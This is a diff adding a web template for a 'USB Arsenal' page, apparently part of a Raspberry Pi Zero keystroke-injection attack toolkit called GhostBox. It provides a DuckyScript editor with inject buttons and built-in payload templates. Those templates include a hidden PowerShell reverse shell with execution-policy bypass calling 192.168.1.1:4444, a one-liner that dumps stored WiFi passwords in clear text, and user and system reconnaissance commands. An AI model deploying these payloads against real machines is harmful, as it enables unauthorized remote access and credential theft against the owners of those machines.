@@ -1,0 +1,151 @@
+{% extends "base.html" %}
+{% block title %}USB Arsenal{% endblock %}
+{% block breadcrumb %}USB Arsenal{% endblock %}
+
+{% block content %}
+<div class="page-header">
+  <div>
+    <div class="page-title">🔌 USB Arsenal</div>
+    <div class="page-subtitle">HID Injection · DuckyScript Engine · USB Gadget</div>
+  </div>
+  <div style="display:flex;align-items:center;gap:.75rem">
+    <span class="badge badge-{{ module.status }}" data-module="usb">{{ module.status }}</span>
+    <button class="btn btn-green" onclick="moduleAction('usb','start')">▶ Start</button>
+    <button class="btn btn-red"   onclick="moduleAction('usb','stop')">■ Stop</button>
+  </div>
+</div>
+
+<!-- Gadget setup -->
+<div class="card" style="margin-bottom:1.25rem">
+  <div class="card-header">
+    <div class="card-title">🔧 USB Gadget Setup</div>
+  </div>
+  <div class="card-body" style="display:flex;gap:.75rem;align-items:center">
+    <div style="flex:1;font-size:.82rem;color:var(--muted)">
+      Configure Pi Zero 2W as USB HID device via ConfigFS. Must be run as root.
+    </div>
+    <button class="btn btn-green" onclick="setupGadget()">⚙ Setup Gadget</button>
+    <button class="btn btn-red"   onclick="teardownGadget()">✕ Remove</button>
+  </div>
+</div>
+
+<div style="display:grid;grid-template-columns:1fr 1fr;gap:1.25rem">
+
+  <!-- DuckyScript Editor -->
+  <div class="card">
+    <div class="card-header">
+      <div class="card-title">📝 DuckyScript Editor</div>
+      <span style="font-size:.72rem;color:var(--muted)">DuckyScript v1 compatible</span>
+    </div>
+    <div class="card-body">
+      <div class="form-group">
+        <label class="form-label">Payload Name</label>
+        <input id="payloadName" class="form-input" placeholder="e.g. reverse_shell" type="text">
+      </div>
+      <div class="form-group">
+        <label class="form-label">Description</label>
+        <input id="payloadDesc" class="form-input" placeholder="Short description..." type="text">
+      </div>
+      <div class="form-group">
+        <label class="form-label">Script</label>
+        <textarea id="duckyScript" class="ducky-editor" placeholder="REM GhostBox Payload
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -w hidden -ep bypass
+ENTER
+DELAY 800
+STRING whoami
+ENTER"></textarea>
+      </div>
+      <div style="display:flex;gap:.5rem">
+        <button class="btn btn-red"   onclick="injectPayload()">⚡ Inject</button>
+        <button class="btn btn-green" onclick="savePayload()">💾 Save</button>
+        <button class="btn btn-ghost" onclick="document.getElementById('duckyScript').value=''">✕ Clear</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Right column -->
+  <div>
+    <!-- Injection log -->
+    <div class="card" style="margin-bottom:1.25rem">
+      <div class="card-header">
+        <div class="card-title">📋 Injection Log</div>
+      </div>
+      <div class="card-body" style="padding:.75rem">
+        <div class="terminal" id="injectionLog">
+          <span class="output">// Waiting for payload injection...</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- Saved payloads -->
+    <div class="card">
+      <div class="card-header">
+        <div class="card-title">📚 Saved Payloads</div>
+        <button class="btn btn-ghost btn-sm" onclick="loadPayloads()">↻ Refresh</button>
+      </div>
+      <div class="card-body" style="padding:.75rem">
+        <div id="payloadList" class="event-feed" style="max-height:250px">
+          {% for p in payloads %}
+          <div class="event-item info" style="cursor:pointer"
+               onclick="loadPayload({{ p | tojson }})">
+            <span class="event-icon">📜</span>
+            <div class="event-body">
+              <div class="event-title">{{ p.name }}</div>
+              <div class="event-detail">{{ p.description or 'No description' }}</div>
+            </div>
+          </div>
+          {% else %}
+          <div style="text-align:center;color:var(--muted);padding:1.5rem;font-size:.8rem;font-family:var(--font-mono)">
+            No saved payloads
+          </div>
+          {% endfor %}
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- Built-in payload templates -->
+<div class="card" style="margin-top:1.25rem">
+  <div class="card-header">
+    <div class="card-title">⚡ Quick Templates</div>
+  </div>
+  <div class="card-body">
+    <div style="display:flex;flex-wrap:wrap;gap:.75rem">
+      {% set templates = [
+        ("sysinfo", "System Info", "REM System Info\nDELAY 1000\nGUI r\nDELAY 500\nSTRING cmd /k systeminfo\nENTER"),
+        ("whoami",  "Who Am I",   "REM Who Am I\nDELAY 1000\nGUI r\nDELAY 500\nSTRING cmd /k whoami && net user\nENTER"),
+        ("reverse", "Rev Shell",  "REM Reverse Shell\nDELAY 1000\nGUI r\nDELAY 500\nSTRING powershell -w hidden -ep bypass -c \"$c=New-Object Net.Sockets.TCPClient('192.168.1.1',4444);$s=$c.GetStream();...\"\nENTER"),
+        ("exfil",   "WiFi Creds", "REM WiFi Passwords\nDELAY 1000\nGUI r\nDELAY 500\nSTRING cmd /k netsh wlan show profiles & for /f \"skip=9 tokens=1,2 delims=:\" %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear\nENTER"),
+      ] %}
+      {% for tid, tname, tscript in templates %}
+      <button class="btn btn-ghost" onclick="loadTemplate({{ tscript | tojson }}, {{ tname | tojson }})">
+        📄 {{ tname }}
+      </button>
+      {% endfor %}
+    </div>
+  </div>
+</div>
+{% endblock %}
+
+{% block scripts %}
+<script>
+async function setupGadget() {
+  const r = await fetch('/api/usb/gadget/setup', {method:'POST'});
+  const d = await r.json();
+  showToast(d.ok ? 'success' : 'error', d.ok ? 'Gadget configured!' : 'Setup failed');
+}
+async function teardownGadget() {
+  await fetch('/api/usb/gadget/teardown', {method:'POST'});
+  showToast('info', 'Gadget removed');
+}
+function loadTemplate(script, name) {
+  document.getElementById('duckyScript').value = script;
+  document.getElementById('payloadName').value = name;
+}
+document.addEventListener('DOMContentLoaded', loadPayloads);
+</script>
+{% endblock %}
